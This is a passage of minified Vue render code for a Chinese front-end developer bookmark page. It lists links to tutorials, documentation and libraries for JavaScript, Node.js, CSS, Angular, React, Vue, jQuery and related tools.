code")])]),t("p",[n._v("综合效果搜索平台")]),t("p",[n._v("综合效果搜索平台 地址")]),t("p",[t("a",{attrs:{href:"http://zoommyapp.com/",target:"_blank"}},[n._v("zoommyapp.com")])]),t("p",[t("a",{attrs:{href:"https://unsplash.com/",target:"_blank"}},[n._v("unsplash.com")])]),t("p",[t("a",{attrs:{href:"https://www.pinterest.com/",target:"_blank"}},[n._v("www.pinterest.com")])]),t("p",[t("a",{attrs:{href:"http://nos.twnsnd.co",target:"_blank"}},[n._v("New Old Stock")])]),t("p",[t("a",{attrs:{href:"http://www.jq22.com",target:"_blank"}},[n._v("效果网")])]),t("p",[t("a",{attrs:{href:"http://huaban.com/",target:"_blank"}},[n._v("花瓣网")])]),t("p",[t("a",{attrs:{href:"http://www.topit.me/",target:"_blank"}},[n._v("优美图")])]),t("p",[t("a",{attrs:{href:"http://codepen.io/",target:"_blank"}},[n._v("codepen")])]),t("p",[t("a",{attrs:{href:"http://www.17sucai.com",target:"_blank"}},[n._v("17素材")])]),t("p",[t("a",{attrs:{href:"http://699pic.com/",target:"_blank"}},[n._v("摄图网")])]),t("p",[t("a",{attrs:{href:"http://microjs.com",target:"_blank"}},[n._v("常用的JavaScript代码片段")])]),t("p",[n._v("周报类")]),t("p",[n._v("周报类 地址")]),t("p",[t("a",{attrs:{href:"http://old.75team.com/weekly/",target:"_blank"}},[n._v("奇舞周刊")])]),t("p",[t("a",{attrs:{href:"http://weekly.manong.io",target:"_blank"}},[n._v("码农周刊")])]),t("p",[t("a",{attrs:{href:"http://www.kancloud.cn/jsfront/month/82796",target:"_blank"}},[n._v("JS前端开发群月报")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com",target:"_blank"}},[n._v("WEB前端开发")])]),t("p",[t("a",{attrs:{href:"http://www.jstips.co",target:"_blank"}},[n._v("A JS tip per day!")])]),t("p",[t("a",{attrs:{href:"https://github.com/PaicHyperionDev/MobileDevWeekly",target:"_blank"}},[n._v("平安科技移动开发二队技术周报")])]),t("p",[n._v("开发中心")]),t("p",[n._v("开发中心 地址")]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript",target:"_blank"}},[n._v("mozilla js参考")])]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/extensions/api_index.html",target:"_blank"}},[n._v("chrome开发中心（chrome的内核已转向blink）")])]),t("p",[t("a",{attrs:{href:"https://developer.apple.com/library/safari/navigation",target:"_blank"}},[n._v("safari开发中心")])]),t("p",[t("a",{attrs:{href:"https://msdn.microsoft.com/zh-cn/library/d1et7k7c",target:"_blank"}},[n._v("microsoft js参考")])]),t("p",[t("a",{attrs:{href:"http://sanshi.me/articles/JavaScript-Garden-CN/html/index.html",target:"_blank"}},[n._v("js秘密花园")])]),t("p",[t("a",{attrs:{href:"http://bonsaiden.github.io/JavaScript-Garden/zh",target:"_blank"}},[n._v("js秘密花园")])]),t("p",[t("a",{attrs:{href:"http://www.w3help.org",target:"_blank"}},[n._v("w3help")])]),t("p",[n._v("Nodejs")]),t("p",[n._v("Nodejs 地址")]),t("p",[t("a",{attrs:{href:"http://liuqing.pw",target:"_blank"}},[n._v("nodejs 篇幅比较巨大")])]),t("p",[t("a",{attrs:{href:"https://github.com/alsotang/node-lessons",target:"_blank"}},[n._v("Node.js 包教不包会")])]),t("p",[t("a",{attrs:{href:"http://www.rainweb.cn/article/category/Nodejs",target:"_blank"}},[n._v("篇幅比较少")])]),t("p",[t("a",{attrs:{href:"http://www.w3cfuns.com/article-5598538-1-1.html",target:"_blank"}},[n._v("node express 入门教程")])]),t("p",[t("a",{attrs:{href:"http://my.oschina.net/u/568264/blog/193773",target:"_blank"}},[n._v("nodejs定时任务")])]),t("p",[t("a",{attrs:{href:"http://60sky.com",target:"_blank"}},[n._v("一个nodejs博客")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yexiaochai/p/3536547.html",target:"_blank"}},[n._v("【NodeJS 学习笔记04】新闻发布系统")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/qqloving/p/3541099.html",target:"_blank"}},[n._v("过年7天乐，学nodejs 也快乐")])]),t("p",[t("a",{attrs:{href:"https://github.com/nqdeng/7-days-nodejs",target:"_blank"}},[n._v("七天学会NodeJS")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/zhongweiv/p/nodejs_events.html",target:"_blank"}},[n._v("Nodejs学习笔记（二）--- 事件模块")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/liusuqi/p/3735491.html",target:"_blank"}},[n._v("nodejs入门")])]),t("p",[t("a",{attrs:{href:"https://github.com/zensh/jsgen",target:"_blank"}},[n._v("angularjs nodejs")])]),t("p",[t("a",{attrs:{href:"http://blog.fens.me/series-nodejs",target:"_blank"}},[n._v("从零开始nodejs系列文章")])]),t("p",[t("a",{attrs:{href:"http://debuggable.com/posts/understanding-node-js:4bd98440-45e4-4a9a-8ef7-0f7ecbdd56cb",target:"_blank"}},[n._v("理解nodejs")])]),t("p",[t("a",{attrs:{href:"http://blog.mixu.net/2011/02/01/understanding-the-node-js-event-loop",target:"_blank"}},[n._v("nodejs事件轮询")])]),t("p",[t("a",{attrs:{href:"http://www.nodebeginner.org/index-zh-cn.html",target:"_blank"}},[n._v("node入门")])]),t("p",[t("a",{attrs:{href:"http://ourjs.com/detail/53e1f281c5910a9806000001",target:"_blank"}},[n._v("nodejs cms")])]),t("p",[t("a",{attrs:{href:"http://ourjs.com/detail/529ca5950cb6498814000005",target:"_blank"}},[n._v("Node初学者入门，一本全面的NodeJS教程")])]),t("p",[t("a",{attrs:{href:"http://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line",target:"_blank"}},[n._v("NodeJS的代码调试和性能调优")])]),t("p",[n._v("综合API")]),t("p",[n._v("综合API 地址")]),t("p",[t("a",{attrs:{href:"http://www.javascripting.com",target:"_blank"}},[n._v("javascripting")])]),t("p",[t("a",{attrs:{href:"http://microjs.com",target:"_blank"}},[n._v("各种流行库搜索")])]),t("p",[t("a",{attrs:{href:"http://www.runoob.com",target:"_blank"}},[n._v("runoob.com-包含各种API集合")])]),t("p",[t("a",{attrs:{href:"http://tool.oschina.net/apidocs",target:"_blank"}},[n._v("开源中国在线API文档合集")])]),t("p",[t("a",{attrs:{href:"http://devdocs.io",target:"_blank"}},[n._v("devdocs")])]),t("p",[n._v("Ecmascript")]),t("p",[n._v("Ecmascript 地址")]),t("p",[t("a",{attrs:{href:"https://leanpub.com/understandinges6/read",target:"_blank"}},[n._v("Understanding ECMAScript 6 - Nicholas C.\n                    Zakas")])]),t("p",[t("a",{attrs:{href:"https://leanpub.com/exploring-es6/read",target:"_blank"}},[n._v("exploring-es6")])]),t("p",[t("a",{attrs:{href:"https://github.com/es6-org/exploring-es6",target:"_blank"}},[n._v("exploring-es6翻译")])]),t("p",[t("a",{attrs:{href:"http://es6-org.github.io/exploring-es6",target:"_blank"}},[n._v("exploring-es6翻译后预览")])]),t("p",[t("a",{attrs:{href:"http://es6.ruanyifeng.com",target:"_blank"}},[n._v("阮一峰 es6")])]),t("p",[t("a",{attrs:{href:"http://javascript.ruanyifeng.com",target:"_blank"}},[n._v("阮一峰 Javascript")])]),t("p",[t("a",{attrs:{href:"http://yanhaijing.com/es5",target:"_blank"}},[n._v("ECMA-262，第 5 版")])]),t("p",[t("a",{attrs:{href:"http://es5.github.io",target:"_blank"}},[n._v("es5")])]),t("p",[n._v("Js template")]),t("p",[n._v("Js template 地址")]),t("p",[t("a",{attrs:{href:"http://garann.github.io/template-chooser",target:"_blank"}},[n._v("template-chooser")])]),t("p",[t("a",{attrs:{href:"https://github.com/aui/artTemplate",target:"_blank"}},[n._v("artTemplate")])]),t("p",[t("a",{attrs:{href:"https://github.com/aui/tmodjs/blob/master/README.md",target:"_blank"}},[n._v("tomdjs")])]),t("p",[t("a",{attrs:{href:"http://juicer.name/docs/docs_zh_cn.html",target:"_blank"}},[n._v("淘宝模板juicer模板")])]),t("p",[t("a",{attrs:{href:"http://koen301.github.io/fxtpl",target:"_blank"}},[n._v("Fxtpl v1.0 繁星前端模板引擎")])]),t("p",[t("a",{attrs:{href:"http://laytpl.layui.com",target:"_blank"}},[n._v("laytpl")])]),t("p",[t("a",{attrs:{href:"https://github.com/mozilla/nunjucks",target:"_blank"}},[n._v("mozilla - nunjucks")])]),t("p",[t("a",{attrs:{href:"https://github.com/PaulGuo/Juicer",target:"_blank"}},[n._v("Juicer")])]),t("p",[t("a",{attrs:{href:"http://akdubya.github.io/dustjs",target:"_blank"}},[n._v("dustjs")])]),t("p",[t("a",{attrs:{href:"http://ecomfe.github.io/etpl",target:"_blank"}},[n._v("etpl")])]),t("p",[n._v("CSS")]),t("p",[n._v("CSS 地址")]),t("p",[t("a",{attrs:{href:"http://tympanus.net/codrops/css_reference",target:"_blank"}},[n._v("CSS 语法参考")])]),t("p",[t("a",{attrs:{href:"http://isux.tencent.com/css3/index.html",target:"_blank"}},[n._v("CSS3动画手册")])]),t("p",[t("a",{attrs:{href:"http://isux.tencent.com/css3/tools.html",target:"_blank"}},[n._v("腾讯css3动画制作工具")])]),t("p",[t("a",{attrs:{href:"http://linxz.github.io/tianyizone",target:"_blank"}},[n._v("志爷css小工具集合")])]),t("p",[t("a",{attrs:{href:"http://www.note12.com/category/blog/2014-6-5/538fe0a9f786f1b7019a4dfb",target:"_blank"}},[n._v("css3 js\n                    移动大杂烩")])]),t("p",[t("a",{attrs:{href:"http://bouncejs.com",target:"_blank"}},[n._v("bouncejs 触摸库")])]),t("p",[t("a",{attrs:{href:"http://fian.my.id/Waves",target:"_blank"}},[n._v("css3 按钮动画")])]),t("p",[t("a",{attrs:{href:"http://daneden.github.io/animate.css",target:"_blank"}},[n._v("animate.css")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2015/10/8536",target:"_blank"}},[n._v("全局CSS的终结(狗带 [译]")])]),t("p",[t("a",{attrs:{href:"http://browserhacks.com",target:"_blank"}},[n._v("browserhacks")])]),t("p",[n._v("Angularjs")]),t("p",[n._v("Angularjs 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/dolymood/AngularLearning",target:"_blank"}},[n._v("Angular.js 的一些学习资源")])]),t("p",[t("a",{attrs:{href:"http://angularjs.cn",target:"_blank"}},[n._v("angularjs中文社区")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/xuwenmin888/p/3739096.html",target:"_blank"}},[n._v("Angularjs源码学习")])]),t("p",[t("a",{attrs:{href:"http://www.ifeenan.com/?c=AngularJS",target:"_blank"}},[n._v("Angularjs源码学习")])]),t("p",[t("a",{attrs:{href:"http://angular-ui.github.io/bootstrap",target:"_blank"}},[n._v("angular对bootstrap的封装")])]),t("p",[t("a",{attrs:{href:"https://cnodejs.org/topic/51404e0f069911196d2e3923",target:"_blank"}},[n._v("angularjs + nodejs")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/lvdabao/tag/AngularJs",target:"_blank"}},[n._v("吕大豹 Angularjs")])]),t("p",[t("a",{attrs:{href:"http://www.infoq.com/cn/news/2013/02/angular-web-app",target:"_blank"}},[n._v("AngularJS 最佳实践")])]),t("p",[t("a",{attrs:{href:"http://www.lovelucy.info/angularjs-best-practices.html",target:"_blank"}},[n._v("Angular的一些扩展指令")])]),t("p",[t("a",{attrs:{href:"https://github.com/Pasvaz/bindonce",target:"_blank"}},[n._v("Angular数据绑定原理")])]),t("p",[t("a",{attrs:{href:"https://github.com/angular-ui",target:"_blank"}},[n._v("一些扩展Angular UI组件")])]),t("p",[t("a",{attrs:{href:"http://voidcanvas.com/emberjs-vs-angularjs-performance-testing",target:"_blank"}},[n._v("Ember和AngularJS的性能测试")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/powertoolsteam/p/angularjs-introdection.html",target:"_blank"}},[n._v("带你走近AngularJS -\n                    基本功能介绍")])]),t("p",[t("a",{attrs:{href:"http://angular.duapp.com/docs/guide",target:"_blank"}},[n._v("Angularjs开发指南")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/amosli/p/3710648.html",target:"_blank"}},[n._v("Angularjs学习")])]),t("p",[t("a",{attrs:{href:"http://www.rainweb.cn/article/angularjs-jquery.html",target:"_blank"}},[n._v("不要带着jQuery的思维去学习AngularJS")])]),t("p",[t("a",{attrs:{href:"http://wangjiatao.diandian.com/?tag=angularjs",target:"_blank"}},[n._v("angularjs 学习笔记")])]),t("p",[t("a",{attrs:{href:"http://www.angularjs.cn/T008",target:"_blank"}},[n._v("angularjs 开发指南")])]),t("p",[t("a",{attrs:{href:"https://github.com/jmcunningham/AngularJS-Learning",target:"_blank"}},[n._v("angularjs 英文资料")])]),t("p",[t("a",{attrs:{href:"http://angular-ui.github.io/bootstrap",target:"_blank"}},[n._v("angular bootstrap")])]),t("p",[t("a",{attrs:{href:"https://github.com/opitzconsulting/jquery-mobile-angular-adapter",target:"_blank"}},[n._v("angular jq\n                    mobile")])]),t("p",[t("a",{attrs:{href:"http://mgcrea.github.io/angular-strap",target:"_blank"}},[n._v("angular ui")])]),t("p",[t("a",{attrs:{href:"http://www.tuicool.com/articles/7ZZVr2",target:"_blank"}},[n._v("整合jQuery Mobile+AngularJS经验谈")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/46589/",target:"_blank"}},[n._v("有jQuery背景，该如何用AngularJS编程思想")])]),t("p",[t("a",{attrs:{href:"http://each.sinaapp.com/angular",target:"_blank"}},[n._v("AngularJS在线教程")])]),t("p",[t("a",{attrs:{href:"http://www.zouyesheng.com/angular.html",target:"_blank"}},[n._v("angular学习笔记")])]),t("p",[n._v("React")]),t("p",[n._v("React 地址")]),t("p",[t("a",{attrs:{href:"http://www.react-china.org",target:"_blank"}},[n._v("react.js 中文论坛")])]),t("p",[t("a",{attrs:{href:"https://facebook.github.io/react/index.html",target:"_blank"}},[n._v("react.js 官方网址")])]),t("p",[t("a",{attrs:{href:"https://facebook.github.io/react/docs/getting-started.html",target:"_blank"}},[n._v("react.js 官方文档")])]),t("p",[t("a",{attrs:{href:"http://material-ui.com/#",target:"_blank"}},[n._v("react.js material UI")])]),t("p",[t("a",{attrs:{href:"http://touchstonejs.io",target:"_blank"}},[n._v("react.js TouchstoneJS UI")])]),t("p",[t("a",{attrs:{href:"http://amazeui.org/react",target:"_blank"}},[n._v("react.js amazeui UI")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2015/03/react.html",target:"_blank"}},[n._v("React 入门实例教程 - 阮一峰")])]),t("p",[t("a",{attrs:{href:"http://wiki.jikexueyuan.com/project/react-native",target:"_blank"}},[n._v("React Native 中文版")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/Fakefish%203053",target:"_blank"}},[n._v("Webpack 和 React 小书 - 前端乱炖")])]),t("p",[t("a",{attrs:{href:"https://fakefish.github.io/react-webpack-cookbook",target:"_blank"}},[n._v("Webpack 和 React 小书 - gitbook")])]),t("p",[t("a",{attrs:{href:"https://github.com/webpack/webpack",target:"_blank"}},[n._v("webpack")])]),t("p",[t("a",{attrs:{href:"http://html-js.com/article/3009",target:"_blank"}},[n._v("Webpack，101入门体验")])]),t("p",[t("a",{attrs:{href:"http://html-js.com/article/3113",target:"_blank"}},[n._v("webpack入门教程")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000003499526",target:"_blank"}},[n._v("基于webpack搭建前端工程解决方案探索")])]),t("p",[t("a",{attrs:{href:"http://www.piliyu.com",target:"_blank"}},[n._v("React原创实战视频教程")])]),t("p",[n._v("vue")]),t("p",[n._v("vue 地址")]),t("p",[t("a",{attrs:{href:"http://cn.vuejs.org",target:"_blank"}},[n._v("Vue")])]),t("p",[t("a",{attrs:{href:"http://forum.vuejs.org",target:"_blank"}},[n._v("Vue 论坛")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/aaronjs/p/3660102.html",target:"_blank"}},[n._v("Vue 入门指南")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000411057",target:"_blank"}},[n._v("Vue 的一些资源索引")])]),t("p",[t("a",{attrs:{href:"https://github.com/vuejs/awesome-vue",target:"_blank"}},[n._v("awesome-vue")])]),t("p",[n._v("移动端API")]),t("p",[n._v("移动端API 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/jtyjty99999/mobileTech",target:"_blank"}},[n._v("99移动端知识集合")])]),t("p",[t("a",{attrs:{href:"https://github.com/AlloyTeam/Mars",target:"_blank"}},[n._v("移动端前端开发知识库")])]),t("p",[t("a",{attrs:{href:"http://caibaojian.com/mobile-web-bug.html",target:"_blank"}},[n._v("移动前端的一些坑和解决方法（外观表现）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/PeunZhang/p/3407453.html",target:"_blank"}},[n._v("【原】移动web资源整理")])]),t("p",[t("a",{attrs:{href:"http://mweb.baidu.com/zeptoapi",target:"_blank"}},[n._v("zepto 1.0 中文手册")])]),t("p",[t("a",{attrs:{href:"http://www.html-5.cn/Manual/Zepto",target:"_blank"}},[n._v("zepto 1.0 中文手册")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/doc/zeptojs_api",target:"_blank"}},[n._v("zepto 1.1.2")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/sky000/archive/2013/03/29/2988952.html",target:"_blank"}},[n._v("zepto 中文注释")])]),t("p",[t("a",{attrs:{href:"http://app-framework-software.intel.com/api.php",target:"_blank"}},[n._v("jqmobile 手册")])]),t("p",[t("a",{attrs:{href:"https://github.com/maxzhang/maxzhang.github.com/issues",target:"_blank"}},[n._v("移动浏览器开发集合")])]),t("p",[t("a",{attrs:{href:"https://github.com/hoosin/mobile-web-favorites",target:"_blank"}},[n._v("移动开发大杂烩")])]),t("p",[n._v("jQuery")]),t("p",[n._v("jQuery 地址")]),t("p",[t("a",{attrs:{href:"http://www.jquery123.com",target:"_blank"}},[n._v("jQuery API 中文文档")])]),t("p",[t("a",{attrs:{href:"http://hemin.cn/jq",target:"_blank"}},[n._v("hemin 在线版")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/jqapi-1.9/on",target:"_blank"}},[n._v("css88 jq api")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/jquery-ui-api",target:"_blank"}},[n._v("css88 jqui api")])]),t("p",[t("a",{attrs:{href:"http://learn.jquery.com",target:"_blank"}},[n._v("学习jquery")])]),t("p",[t("a",{attrs:{href:"http://james.padolsey.com/jquery",target:"_blank"}},[n._v("jquery 源码查找")])]),t("p",[n._v("D3")]),t("p",[n._v("D3 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/mbostock/d3/wiki/Tutorials",target:"_blank"}},[n._v("d3 Tutorials")])]),t("p",[t("a",{attrs:{href:"https://github.com/mbostock/d3/wiki/Gallery",target:"_blank"}},[n._v("Gallery")])]),t("p",[t("a",{attrs:{href:"http://datavisual.lofter.com/post/40cf3a_188e535",target:"_blank"}},[n._v("lofter")])]),t("p",[t("a",{attrs:{href:"http://alanland.iteye.com/blog/1878595",target:"_blank"}},[n._v("iteye")])]),t("p",[t("a",{attrs:{href:"http://javascript.ruanyifeng.com/library/d3.html",target:"_blank"}},[n._v("ruanyifeng")])]),t("p",[n._v("Requriejs")]),t("p",[n._v("Requriejs 地址")]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2012/10/javascript_module.html",target:"_blank"}},[n._v("Javascript模块化编程（一）：模块的写法")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2012/10/asynchronous_module_definition.html",target:"_blank"}},[n._v("Javascript模块化编程（二）：AMD规范")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2012/11/require_js.html",target:"_blank"}},[n._v("Javascript模块化编程（三）：require.js的用法")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/snandy/archive/2012/05/22/2513652.html",target:"_blank"}},[n._v("RequireJS入门（一）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/snandy/archive/2012/05/23/2513712.html",target:"_blank"}},[n._v("RequireJS入门（二）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/snandy/archive/2012/06/08/2538001.html",target:"_blank"}},[n._v("RequireJS进阶（三）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yexiaochai/p/3632580.html",target:"_blank"}},[n._v("requrie源码学习")])]),t("p",[t("a",{attrs:{href:"http://www.oschina.net/translate/getting-started-with-the-requirejs-library",target:"_blank"}},[n._v("requrie\n                    入门指南")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yexiaochai/p/3214926.html",target:"_blank"}},[n._v("requrieJS 学习笔记")])]),t("p",[t("a",{attrs:{href:"http://cyj.me/why-seajs/requirejs/",target:"_blank"}},[n._v("requriejs 其一")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yexiaochai/p/3221081.html",target:"_blank"}},[n._v("require backbone结合")])]),t("p",[n._v("Seajs")]),t("p",[n._v("Seajs 地址")]),t("p",[t("a",{attrs:{href:"http://seajs.org",target:"_blank"}},[n._v("seajs")])]),t("p",[t("a",{attrs:{href:"http://cyj.me/why-seajs/zh",target:"_blank"}},[n._v("seajs 中文手册")])]),t("p",[n._v("Less,sass")]),t("p",[n._v("Less,sass 地址")]),t("p",[t("a",{attrs:{href:"http://www.w3cplus.com/sassguide",target:"_blank"}},[n._v("sass")])]),t("p",[t("a",{attrs:{href:"http://www.sass.hk",target:"_blank"}},[n._v("sass教程-sass中国")])]),t("p",[t("a",{attrs:{href:"http://sass.bootcss.com",target:"_blank"}},[n._v("Sass 中文文档")])]),t("p",[t("a",{attrs:{href:"http://less.bootcss.com",target:"_blank"}},[n._v("less")])]),t("p",[n._v("Markdown")]),t("p",[n._v("Markdown 地址")]),t("p",[t("a",{attrs:{href:"http://wowubuntu.com/markdown",target:"_blank"}},[n._v("Markdown 语法说明 (简体中文版")])]),t("p",[t("a",{attrs:{href:"https://github.com/LearnShare/Learning-Markdown/blob/master/README.md",target:"_blank"}},[n._v("markdown入门参考")])]),t("p",[t("a",{attrs:{href:"https://www.gitbook.com",target:"_blank"}},[n._v("gitbook")])]),t("p",[t("a",{attrs:{href:"https://www.zybuluo.com/mdeditor",target:"_blank"}},[n._v("mdeditor")])]),t("p",[t("a",{attrs:{href:"https://stackedit.io",target:"_blank"}},[n._v("stackedit")])]),t("p",[t("a",{attrs:{href:"http://bh-lay.github.io/mditor",target:"_blank"}},[n._v("mditor")])]),t("p",[t("a",{attrs:{href:"https://github.com/lepture/editor",target:"_blank"}},[n._v("lepture-editor")])]),t("p",[t("a",{attrs:{href:"https://github.com/jbt/markdown-editor",target:"_blank"}},[n._v("markdown-editor")])]),t("p",[t("a",{attrs:{href:"https://www.zybuluo.com",target:"_blank"}},[n._v("作业部落")])]),t("p",[n._v("兼容性")]),t("p",[n._v("兼容性 地址")]),t("p",[t("a",{attrs:{href:"http://kangax.github.io/compat-table/es6",target:"_blank"}},[n._v("esma 兼容列表")])]),t("p",[t("a",{attrs:{href:"http://jigsaw.w3.org/css-validator/validator.html.zh-cn",target:"_blank"}},[n._v("W3C CSS验证服务")])]),t("p",[t("a",{attrs:{href:"http://caniuse.com/#index",target:"_blank"}},[n._v("caniuse")])]),t("p",[t("a",{attrs:{href:"http://csscreator.com/properties",target:"_blank"}},[n._v("csscreator")])]),t("p",[t("a",{attrs:{href:"https://msdn.microsoft.com/zh-cn/library/cc351024",target:"_blank"}},[n._v("microsoft")])]),t("p",[t("a",{attrs:{href:"http://www.responsinator.com",target:"_blank"}},[n._v("在线测兼容-移动端")])]),t("p",[t("a",{attrs:{href:"https://www.manymo.com/emulators",target:"_blank"}},[n._v("emulators")])]),t("p",[n._v("UI相关")]),t("p",[n._v("UI相关 地址")]),t("p",[t("a",{attrs:{href:"http://v3.bootcss.com",target:"_blank"}},[n._v("bootcss")])]),t("p",[t("a",{attrs:{href:"http://www.w3cplus.com/MetroUICSS",target:"_blank"}},[n._v("MetroUICSS")])]),t("p",[t("a",{attrs:{href:"http://semantic-ui.com",target:"_blank"}},[n._v("semantic")])]),t("p",[t("a",{attrs:{href:"http://alexwolfe.github.io/Buttons",target:"_blank"}},[n._v("Buttons")])]),t("p",[t("a",{attrs:{href:"http://hiloki.github.io/kitecss",target:"_blank"}},[n._v("kitecss")])]),t("p",[t("a",{attrs:{href:"http://www.pintuer.com",target:"_blank"}},[n._v("pintuer")])]),t("p",[t("a",{attrs:{href:"http://amazeui.org",target:"_blank"}},[n._v("amazeui")])]),t("p",[t("a",{attrs:{href:"http://www.worldhello.net/gotgithub/index.html",target:"_blank"}},[n._v("worldhello")])]),t("p",[t("a",{attrs:{href:"http://igit.linuxtoy.org/contents.html",target:"_blank"}},[n._v("linuxtoy")])]),t("p",[t("a",{attrs:{href:"http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/zh_cn",target:"_blank"}},[n._v("gitmagic")])]),t("p",[t("a",{attrs:{href:"http://rogerdudler.github.io/git-guide/index.zh.html",target:"_blank"}},[n._v("rogerdudler")])]),t("p",[t("a",{attrs:{href:"http://gitref.justjavac.com",target:"_blank"}},[n._v("gitref")])]),t("p",[t("a",{attrs:{href:"http://git-scm.com/book/zh",target:"_blank"}},[n._v("book")])]),t("p",[t("a",{attrs:{href:"http://gogojimmy.net/2012/01/17/how-to-use-git-1-git-basic",target:"_blank"}},[n._v("gogojimmy")])]),t("p",[n._v("其它API")]),t("p",[n._v("其它API 地址")]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/bookmark/1230000002521721",target:"_blank"}},[n._v("HTTP API 设计指南")])]),t("p",[n._v("javascript流行库汇总 javascriptoo")]),t("p",[t("a",{attrs:{href:"http://niceue.com/validator/demo/index.php",target:"_blank"}},[n._v("验证api")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/doc/underscore",target:"_blank"}},[n._v("underscore 中文手册")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/Underscorejs-source-code-analysis-of-underscorejs-source-code-analysis%203031",target:"_blank"}},[n._v("underscore源码分析")])]),t("p",[t("a",{attrs:{href:"http://yalishizhude.github.io/tags/underscore",target:"_blank"}},[n._v("underscore源码分析-亚里士朱德的博客")])]),t("p",[t("a",{attrs:{href:"http://underscorejs.org",target:"_blank"}},[n._v("underscrejs en api")])]),t("p",[t("a",{attrs:{href:"https://lodash.com",target:"_blank"}},[n._v("lodash - underscore的代替品")])]),t("p",[t("a",{attrs:{href:"http://extjs-doc-cn.github.io/ext4api",target:"_blank"}},[n._v("ext4api")])]),t("p",[t("a",{attrs:{href:"http://www.csser.com/tools/backbone/backbone.js.html",target:"_blank"}},[n._v("backbone 中文手册")])]),t("p",[t("a",{attrs:{href:"http://dev.qwrap.com/resource/js/_docs/_youa/#/qw/base/loadJs_.htm",target:"_blank"}},[n._v("qwrap手册")])]),t("p",[t("a",{attrs:{href:"http://easings.net/zh-cn",target:"_blank"}},[n._v("缓动函数")])]),t("p",[t("a",{attrs:{href:"http://www.w3school.com.cn/svg/svg_reference.asp",target:"_blank"}},[n._v("svg 中文参考")])]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/en-US/docs/Web/SVG",target:"_blank"}},[n._v("svg mdn参考")])]),t("p",[t("a",{attrs:{href:"https://github.com/gabelerner/canvg",target:"_blank"}},[n._v("svg 导出 canvas")])]),t("p",[t("a",{attrs:{href:"https://github.com/exupero/saveSvgAsPng",target:"_blank"}},[n._v("svg 导出 png")])]),t("p",[t("a",{attrs:{href:"http://www.zamzar.com/convert/ai-to-svg",target:"_blank"}},[n._v("ai-to-svg")])]),t("p",[t("a",{attrs:{href:"https://github.com/machao/localStorage",target:"_blank"}},[n._v("localStorage 库")])]),t("p",[n._v("图表类")]),t("p",[n._v("图表类 地址")]),t("p",[t("a",{attrs:{href:"http://www.hcharts.cn/api/index.php",target:"_blank"}},[n._v("Highcharts 中文API")])]),t("p",[t("a",{attrs:{href:"http://api.highcharts.com/highcharts",target:"_blank"}},[n._v("Highcharts 英文API")])]),t("p",[t("a",{attrs:{href:"http://echarts.baidu.com/",target:"_blank"}},[n._v("ECharts 百度的图表软件")])]),t("p",[t("a",{attrs:{href:"http://lbs.amap.com/api",target:"_blank"}},[n._v("高德地图")])]),t("p",[t("a",{attrs:{href:"http://paperjs.org",target:"_blank"}},[n._v("开源的矢量图脚本框架")])]),t("p",[t("a",{attrs:{href:"http://jvectormap.com",target:"_blank"}},[n._v("svg 地图")])]),t("p",[n._v("正则")]),t("p",[n._v("正则 地址")]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000002471140",target:"_blank"}},[n._v("JS正则表达式元字符")])]),t("p",[t("a",{attrs:{href:"http://deerchao.net/tutorials/regex/regex.htm",target:"_blank"}},[n._v("正则表达式30分钟入门教程")])]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions",target:"_blank"}},[n._v("MDN-正则表达式")])]),t("p",[t("a",{attrs:{href:"http://javascript.ruanyifeng.com/stdlib/regexp.html",target:"_blank"}},[n._v("ruanyifeng - RegExp对象")])]),t("p",[t("a",{attrs:{href:"http://div.io/topic/764?page=1",target:"_blank"}},[n._v("小胡子哥 - 进阶正则表达式")])]),t("p",[t("a",{attrs:{href:"https://github.com/Cedriking/is.js/blob/master/is.js",target:"_blank"}},[n._v("is.js")])]),t("p",[t("a",{attrs:{href:"http://regexper.com",target:"_blank"}},[n._v("正则在线测试")])]),t("p",[n._v("前端")]),t("p",[n._v("前端 